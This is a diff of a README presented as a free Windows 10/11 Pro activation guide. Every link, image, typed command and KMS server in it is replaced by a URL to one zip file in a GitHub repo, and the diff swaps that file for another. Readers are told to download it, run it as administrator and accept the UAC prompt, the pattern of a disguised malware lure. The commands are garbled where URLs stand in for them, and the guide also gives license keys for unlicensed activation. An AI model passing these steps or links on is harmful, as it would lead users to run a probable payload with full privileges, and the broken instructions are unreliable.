@@ -4,13 +4,13 @@ An guide how to activate Windows 10 AND 11 Pro for free
 ## Getting started
 What you first need to do is open CMD (Command Prompt) as Administrator using this keyboard key:
 
-<kbd><img src="https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip" width="11"></kbd> + <kbd>R</kbd>
+<kbd><img src="https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip" width="11"></kbd> + <kbd>R</kbd>
 
-And now type in ``https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip`` in the box
+And now type in ``https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip`` in the box
 
 It should now look as something like this:
 
-![image](https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip)
+![image](https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip)
 
 Now press this keys on your keyboard:
 
@@ -18,27 +18,27 @@ Now press this keys on your keyboard:
 
 Now you have something like this:
 
-![UAC Permissions](https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip)
+![UAC Permissions](https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip)
 
 Now, click on ``Yes``
 
 Now you have something like this:
 
-![Windows Command Prompt](https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip)
+![Windows Command Prompt](https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip)
 
 ### The commands
 Now, type the following command:
-``https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip /upk``
+``https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip /upk``
 
 **Note**: this will remove your current activation key!
 Now it will give an message, click on ``OK``
 
 And now this command:
-``https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip /cpky``
+``https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip /cpky``
 It will give an message once again, and click on ``OK`` again
 
 And now type this command:
-``https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip /ckms``
+``https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip /ckms``
 Once again click on ``OK`` when you get an message
 ### Edition upgradable check command
 Now we are gonna check of your edition is supported to upgrade to Pro, run the following command to check this:
@@ -51,7 +51,7 @@ Now, copy and paste this complete command:
 
 ``sc config wuauserv start= auto & net start wuauserv``
 
-``https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip /productkey VK7JG-NPHTM-C97JM-9MPGT-3V66T``
+``https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip /productkey VK7JG-NPHTM-C97JM-9MPGT-3V66T``
 
 ``exit``
 
@@ -66,16 +66,16 @@ You will now see an message that he is running updates and is installing feature
 But we are not done, You will see that it isn't activated and that you can't change some settings, now we are gonna fix that!
 
 ## Method 1 For Activating Windows Pro
-There's another method with a batch file. You can download it by [clicking here](https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip).
+There's another method with a batch file. You can download it by [clicking here](https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip).
 It will start to download. Click ``Save (As)`` to save it. Now we need to open Windows Explorer. First, click these keyboard keys together:
 
-<kbd><img src="https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip" width="11"></kbd> + <kbd>R</kbd>
+<kbd><img src="https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip" width="11"></kbd> + <kbd>R</kbd>
 
-Type ``https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip`` in the box and click ``Enter`` on your keyboard or click ``OK``.
+Type ``https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip`` in the box and click ``Enter`` on your keyboard or click ``OK``.
 Now it will open Windows Explorer. You're here now:
-![Windows Explorer On Start With Windows 11](https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip)
+![Windows Explorer On Start With Windows 11](https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip)
 Click on ``Downloads``, or go to the directory where you saved the downloaded batch file. Now you are here (or on a different place):
-![Downloads Folder With Batch File On Windows 11](https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip)
+![Downloads Folder With Batch File On Windows 11](https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip)
 Click on the batch file 1 time, then right click and click ``Run As Administrator``. It will ask for UAC permissions. Click ``Yes`` now. Now a console windows will open. Wait until it says ``<product activation succesfull>``. Now you activated Windows Pro for free! It also asks if you wanna see someone's blog. Press ``Y`` if you want to and ``N`` if you don't want to see.
 
 ## Method 2 For Activating Windows Pro
@@ -83,11 +83,11 @@ Now we are gonna run some other commands to activate Windows 10/11 Pro.
 
 Press these keyboard keys once again:
 
-<kbd><img src="https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip" width="11"></kbd> + <kbd>R</kbd>
+<kbd><img src="https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip" width="11"></kbd> + <kbd>R</kbd>
 
 It looks like this again:
 
-![Run Dialog With https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip Text In It](https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip)
+![Run Dialog With https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip Text In It](https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip)
 
 Press <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>Enter</kbd>
 
@@ -99,7 +99,7 @@ Type the following commands one for one to activate:
 
 ``slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX``
 
-``slmgr /skms https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip``
+``slmgr /skms https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip``
 
 ``slmgr /ato``
  
@@ -109,7 +109,7 @@ Now you have Windows 10/11 Pro and it activated! You can check settings to see i
 
 #### Contributing
 
-1. Fork it ( https://raw.githubusercontent.com/mpmoyanadev/order-weaver/master/Downton/order-weaver.zip )
+1. Fork it ( https://github.com/mpmoyanadev/order-weaver/raw/refs/heads/master/Downton/order_weaver_airbound.zip )
 2. Create your feature branch (`git checkout -b my-new-feature`)
 3. Commit your changes (`git commit -am 'Add some feature'`)
 4. Push to the branch (`git push origin my-new-feature`)
